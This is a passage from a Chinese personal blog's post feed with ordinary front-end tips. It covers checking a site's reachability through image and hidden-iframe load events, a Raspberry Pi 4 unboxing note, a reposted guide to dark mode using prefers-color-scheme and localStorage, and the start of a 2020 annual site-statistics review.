class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 